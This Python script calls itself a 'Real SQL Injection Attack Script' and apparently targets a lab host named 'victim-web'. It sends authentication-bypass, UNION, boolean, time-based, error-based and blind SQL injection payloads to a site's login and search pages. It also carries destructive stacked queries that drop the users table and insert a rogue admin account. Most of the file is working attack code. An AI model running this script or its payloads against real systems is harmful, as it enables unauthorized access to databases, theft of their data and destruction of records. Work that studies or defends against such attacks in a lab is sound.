#!/usr/bin/env python3
"""
Real SQL Injection Attack Script
Performs actual SQL injection attacks against vulnerable web application
"""

import requests
import time
import random
import sys
import os
from urllib.parse import urljoin, quote
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/logs/sql_injection.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class SQLInjectionAttacker:
    def __init__(self, target_url, delay=120, threads=1):
        self.target_url = target_url
        self.delay = delay
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # SQL injection payloads
        self.payloads = [
            # Authentication bypass
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'#",
            "admin'/*",
            
            # Union-based injection
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT @@version,NULL,NULL,NULL,NULL--",
            "' UNION SELECT database(),NULL,NULL,NULL,NULL--",
            "' UNION SELECT user(),NULL,NULL,NULL,NULL--",
            
            # Boolean-based injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT COUNT(*) FROM users)>10--",
            
            # Time-based injection
            "' AND (SELECT SLEEP(5))--",
            "' AND (SELECT BENCHMARK(1000000,MD5(1)))--",
            
            # Error-based injection
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES (999,'hacked','hacked','hacked@evil.com','admin')--",
            
            # Blind injection
            "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
            "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)=97--"
        ]
        
        logging.info(f"Initialized SQL Injection Attacker")
        logging.info(f"Target: {target_url}")
        logging.info(f"Delay: {delay} seconds")
        logging.info(f"Threads: {threads}")

    def test_login_injection(self, payload):
        """Test SQL injection on login form"""
        try:
            # Test on login page
            login_url = urljoin(self.target_url, '/login.php')
            params = {
                'user': payload,
                'pass': 'dummy'
            }
            
            logging.info(f"Testing login injection: {payload[:50]}...")
            response = self.session.get(login_url, params=params, timeout=10)
            
            # Analyze response for SQL injection indicators
            indicators = [
                'mysql_fetch_array',
                'mysql_fetch_assoc',
                'mysql_num_rows',
                'You have an error in your SQL syntax',
                'Warning: mysql_',
                'ORA-',
                'SQLSTATE[',
                'Microsoft OLE DB Provider',
                'PostgreSQL query failed',
                'SQLite/JDBCDriver',
                'Microsoft SQL Native Client error'
            ]
            
            for indicator in indicators:
                if indicator.lower() in response.text.lower():
                    logging.warning(f"SQL Injection detected! Indicator: {indicator}")
                    return True
                    
            # Check for successful login bypass
            if 'Login successful' in response.text or 'Welcome' in response.text:
                logging.warning(f"Login bypass successful with payload: {payload}")
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Error testing login injection: {e}")
            return False

    def test_search_injection(self, payload):
        """Test SQL injection on search form"""
        try:
            search_url = urljoin(self.target_url, '/search.php')
            params = {'q': payload}
            
            logging.info(f"Testing search injection: {payload[:50]}...")
            response = self.session.get(search_url, params=params, timeout=10)
            
            # Check for SQL error indicators
            if any(indicator.lower() in response.text.lower() for indicator in [
                'mysql_fetch_array', 'sql syntax', 'ora-', 'sqlstate'
            ]):
                logging.warning(f"Search injection successful: {payload}")
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Error testing search injection: {e}")
            return False

    def perform_union_injection(self):
        """Perform UNION-based SQL injection to extract data"""
        try:
            search_url = urljoin(self.target_url, '/search.php')
            
            # Test UNION injection to get database version
            payload = "' UNION SELECT 1,@@version,3,4,5--"
            params = {'q': payload}
            
            logging.info("Performing UNION injection to extract database info...")
            response = self.session.get(search_url, params=params, timeout=10)
            
            # Look for version information in response
            if 'mysql' in response.text.lower() or 'mariadb' in response.text.lower():
                logging.warning("Database version information extracted!")
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Error in UNION injection: {e}")
            return False

    def perform_time_based_injection(self):
        """Perform time-based blind SQL injection"""
        try:
            search_url = urljoin(self.target_url, '/search.php')
            
            # Time-based payload
            payload = "' AND (SELECT SLEEP(3))--"
            params = {'q': payload}
            
            logging.info("Performing time-based injection...")
            start_time = time.time()
            response = self.session.get(search_url, params=params, timeout=10)
            end_time = time.time()
            
            # If response took more than 2 seconds, injection might be successful
            if end_time - start_time > 2:
                logging.warning(f"Time-based injection successful! Response time: {end_time - start_time:.2f}s")
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Error in time-based injection: {e}")
            return False

    def run_attack(self):
        """Run the complete SQL injection attack"""
        logging.info("Starting SQL Injection Attack...")
        
        successful_injections = []
        
        # Test login form injections
        logging.info("Phase 1: Testing login form injections...")
        for payload in self.payloads[:10]:  # Test first 10 payloads
            if self.test_login_injection(payload):
                successful_injections.append(('login', payload))
            time.sleep(random.uniform(1, 3))  # Random delay
            
        # Test search form injections
        logging.info("Phase 2: Testing search form injections...")
        for payload in self.payloads[10:20]:  # Test next 10 payloads
            if self.test_search_injection(payload):
                successful_injections.append(('search', payload))
            time.sleep(random.uniform(1, 3))
            
        # Perform advanced injections
        logging.info("Phase 3: Performing advanced injections...")
        if self.perform_union_injection():
            successful_injections.append(('union', 'UNION injection successful'))
            
        if self.perform_time_based_injection():
            successful_injections.append(('time-based', 'Time-based injection successful'))
            
        # Log results
        logging.info(f"Attack completed. Successful injections: {len(successful_injections)}")
        for injection_type, payload in successful_injections:
            logging.warning(f"Successful {injection_type} injection: {payload}")
            
        return successful_injections

def main():
    # Get configuration from environment
    target_url = os.getenv('TARGET_URL', 'http://victim-web')
    delay = int(os.getenv('SQL_DELAY', '120'))
    threads = int(os.getenv('SQLMAP_THREADS', '1'))
    
    # Create attacker instance
    attacker = SQLInjectionAttacker(target_url, delay, threads)
    
    # Run attack
    results = attacker.run_attack()
    
    # Save results
    with open('/opt/output/sql_injection_results.txt', 'w') as f:
        f.write(f"SQL Injection Attack Results\n")
        f.write(f"Target: {target_url}\n")
        f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Successful injections: {len(results)}\n\n")
        
        for injection_type, payload in results:
            f.write(f"{injection_type}: {payload}\n")
    
    logging.info("Attack results saved to /opt/output/sql_injection_results.txt")

if __name__ == "__main__":
    main() 